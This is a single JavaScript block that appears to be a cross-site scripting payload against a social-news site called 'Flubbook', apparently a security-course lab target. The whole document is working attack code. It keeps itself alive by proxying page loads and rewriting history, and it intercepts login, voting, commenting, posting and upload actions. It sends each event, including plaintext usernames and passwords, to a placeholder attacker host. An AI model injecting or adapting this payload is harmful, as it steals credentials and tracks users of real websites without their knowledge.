<script>
  function payload(attacker) {
    function log(data) {
      console.log($.param(data));
      $.get(attacker, data);
    }
    function proxy(href) {
      $("html").load(href, function(){
        $("html").show();
        if (href === "./") href = "index.php";
        var file = ((href.lastIndexOf('?') === -1) ? href : href.substring(0, href.lastIndexOf('?')));
        var username = document.getElementById("logged-in-user");
        var user = ((username === null) ? "" : username.innerHTML);
        log({event: "nav", user: user, url: file});
        history.pushState({url: href}, null, href);
        eventListeners();
      });
    }
    function eventListeners() {
      $( "#login-btn" ).click(function(event) {
        event.preventDefault();
        var username = document.querySelector("#username").value;
        var password = document.querySelector("#userpass").value;
        log({event: "login", user: username, pass: password});
        $("html").hide();
        $.ajax({
          method: "POST",
          url: "post.php",
          data: { username: username, password: password, form: "login" },
          async: false
        });
        proxy("./");
      });
      $( "#logout-lnk" ).click(function(event) {
        event.preventDefault();
        var username = document.getElementById("logged-in-user").innerHTML;
        log({event: "logout", user: username});
        $("html").hide();
        $.ajax({
          url: "logout.php",
          async: false
        });
        proxy("./");
      });
      $( ".view-post-lnk" ).click(function(event) {
        event.preventDefault();
        var href = $(this).attr("href").substring(9);
        var params = new URLSearchParams(href);
        var id = params.get("id");
        var username = document.getElementById("logged-in-user");
        var user = ((username === null) ? "" : username.innerHTML);
        log({event: "view", user: user, post: id});
        $("html").hide();
        proxy("view.php?id=" + id);
      });
      $( ".upvote-lnk" ).click(function(event) {
        event.preventDefault();
        var href = $(this).attr("href").substring(9);
        const params = new URLSearchParams(href);
        var id = params.get("id");
        var username = document.getElementById("logged-in-user").innerHTML;
        log({event: "vote", user: username, post: id, vote: "1"});
        $("html").hide();
        $.ajax({
          url: "vote.php",
          data: { id: id, vote: "1" },
          async: false
        });
        proxy("view.php?id=" + id);
      });
      $( ".downvote-lnk" ).click(function(event) {
        event.preventDefault();
        var href = $(this).attr("href").substring(9);
        const params = new URLSearchParams(href);
        var id = params.get("id");
        var username = document.getElementById("logged-in-user").innerHTML;
        log({event: "vote", user: username, post: id, vote: "-1"});
        $("html").hide();
        $.ajax({
          url: "vote.php",
          data: { id: id, vote: "-1" },
          async: false
        });
        proxy("view.php?id=" + id);
      });
      $( "#comment-post-btn" ).click(function(event) {
        event.preventDefault();
        const urlParams = new URLSearchParams(window.location.search);
        var id = urlParams.get("id");
        var username = document.getElementById("logged-in-user").innerHTML;
        var parentid = document.querySelector("#parent").value;
        var uid = document.querySelector("#uid").value;
        var comment = document.querySelector("#comment").value;
        log({event: "comment", user: username, parent: parentid});
        $("html").hide();
        $.ajax({
          method: "POST",
          url: "post.php",
          data: { comment: comment, form: "comment", parent: parentid, uid: uid },
          async: false
        });
        proxy("view.php?id=" + parentid);
      });
      $( "#content-post-btn" ).click(function(event) {
        event.preventDefault();
        var username = document.getElementById("logged-in-user").innerHTML;
        var title = document.querySelector("#title").value;
        var content = document.querySelector("#content").value;
        var type = document.querySelector("#type").value;
        log({event: "post", user: username, title: title, type: type });
        $("html").hide();
        $.ajax({
          method: "POST",
          url: "post.php",
          data: { title: title, content: content, type: type, form: "content" },
          async: false
        });
        proxy("./");
      });
      $( "#image-post-btn" ).click(function(event) {
        event.preventDefault();
        var username = document.getElementById("logged-in-user").innerHTML;
        log({event: "image", user: username});
        $("html").hide();
        var formData = new FormData($("#image-upload-frm")[0]);
        $.ajax({
          type: "POST",
          url: "upload.php",
          data: formData,
          cache: false,
          contentType: false,
          processData: false,
          async: false
        });
        proxy("./");
      });
      $( ".actual-post-lnk" ).click(function(event) {
        var username = document.getElementById("logged-in-user");
        var user = ((username === null) ? "" : username.innerHTML);
        var url = $(this).attr("href");
        log({event: "link", user: user, link: url});
      });
      $( "#flubbook-lnk" ).click(function(event) {
        event.preventDefault();
        $("html").hide();
        proxy("./");
      });
      $( "#login-lnk" ).click(function(event) {
        event.preventDefault();
        $("html").hide();
        proxy("login.php");
      });
      $( "#post-lnk" ).click(function(event) {
        event.preventDefault();
        $("html").hide();
        proxy("content.php");
      });
      $( ".comment-reply-lnk" ).click(function(event) {
        event.preventDefault();
        var href = $(this).attr("href");
        $("html").hide();
        proxy(href);
      });
      $( "#haha-lnk" ).click(function(event) {
        event.preventDefault();
        $("html").hide();
        proxy("privacy.php");
      });
    }
    $(window).on('popstate', function(event) {
      $("html").hide();
      console.log(event.state);
      var href = window.location.href;
      href = href.substring(href.lastIndexOf('/')+1);
      var file = ((href.lastIndexOf('?') === -1) ? href : href.substring(0, href.lastIndexOf('?')));
      $("html").load(href, function(){
        $("html").show();
        var username = document.getElementById("logged-in-user");
        var user = ((username === null) ? "" : username.innerHTML);
        log({event: "nav", user: user, url: file});
        eventListeners();
      });
    });
    eventListeners();
  }
payload(<attacker>);
</script>
